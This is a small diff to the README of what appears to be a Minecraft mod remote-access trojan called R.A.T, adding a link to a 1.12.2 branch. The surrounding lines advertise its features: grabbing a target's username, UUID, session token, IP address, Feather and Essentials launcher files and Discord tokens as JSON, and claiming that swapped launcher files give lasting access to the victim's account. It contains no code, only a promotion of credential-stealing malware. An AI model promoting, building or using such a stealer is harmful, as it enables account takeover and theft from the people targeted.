@@ -15,6 +15,8 @@
 
 > Check out [DxxxxY/TokenAuth](https://github.com/DxxxxY/TokenAuth), a session id login mod.
 
+> [1.12.2](https://github.com/DxxxxY/R.A.T/tree/1.12.2) version without discord tokens.
+
 ## Features
 - Grabs the **username, uuid, token, ip, feather file, essentials file and discord tokens** of a target as a *JSON*.
 - Apparently switching the feather or essential files with yours grants you infinite access to their account thanks to the **refreshToken**. (Unconfirmed, ask Annah#5795)
